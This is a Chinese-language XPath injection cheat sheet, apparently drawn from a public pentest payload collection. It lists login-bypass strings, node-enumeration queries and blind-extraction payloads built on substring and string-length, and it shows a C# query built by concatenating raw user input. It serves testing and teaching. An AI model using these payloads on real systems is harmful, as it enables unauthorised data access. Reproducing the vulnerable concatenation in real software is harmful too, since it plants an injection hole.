＃ XPATH注入
XPath注入是一种攻击技术，用于利用从用户提供的输入中构建XPath（XML路径语言）查询来查询或导航XML文档的应用程序。

## 利用
类似于SQL : "string(//user[name/text()='" +vuln_var1+ "' and password/text()=’" +vuln_var1+ "']/account/text())"
```
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
```

## 盲注利用
```
1. 字符串长度
and string-length(account)=SIZE_INT

2. 提取一个字符串
substring(//user[userid=5]/username,2,1)=CHAR_HERE
substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
```


## Thanks to
* [OWASP XPATH Injection](https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
* [XPATH Blind Explorer](http://code.google.com/p/xpath-blind-explorer/)

expr = nav.Compile("string(//user[name/text()='"+TextBox1.Text+"' and password/text()='"+TextBox2.Text+"']/account/text())");

NoSuchUser'] | P | //user[name/text()='NoSuchUser

这将形成以下XPath查询:

string(//user[name/text()='Foobar'] | p | //user[name/text()='NoSuchUser' and password/text()='NoSuchPass']/account/text())

元素的属性数量是
count(path/attribute::*)
第N个属性名称是
(path/attribute::*[position()=N])

首先，我们需要知道各个子节点的数量：
count（path/child::node()）-给定路径的所有节点的计数。
count（path/child::text()）-文本字段子项的数量（最多1个）。
count（path/child::comment()）-注释节点的数量。
count（path/child::*）-元素子元素的数量。
count（path/child::processing-instruction()）-PI节点的数量。

计算字符串长度
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''='
盲注
' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''='